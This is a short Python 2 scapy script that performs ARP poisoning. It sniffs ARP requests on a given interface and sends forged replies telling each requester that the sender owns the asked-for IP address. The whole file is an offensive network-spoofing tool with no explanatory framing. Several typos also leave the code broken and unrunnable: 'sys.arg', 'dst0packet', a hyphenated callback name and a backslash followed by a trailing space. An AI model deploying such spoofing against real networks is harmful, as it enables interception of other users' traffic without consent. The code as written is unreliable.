#!/usr/bin/python

import sys
from scapy.all import sniff, sendp, ARP, Ether 

if len(sys.arg) < 2:
    print sys.argv[0] + " <face>"
    sys.exit(0)

def arp_poison_callback(packet):
    # Got ARP request?
    if packet[ARP].op == 1:
        answer = Ether(dst0packet[ARP].hwsrc) / ARP()
        answer[ARP].op = "is-at"
        answer[ARP].hwdst = packet[ARP].hwsrc
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].pdst = packet[ARP].psrc 

        print "Fooling " + packet[ARP].psrc + " that " + \ 
              packet[ARP].pdst + " is me"

        sendp(answer, iface=sys.argv[1])

sniff(prn=arp_poison-callback, 
      filter="arp",
      iface=sys.argv[1],
      store=0)

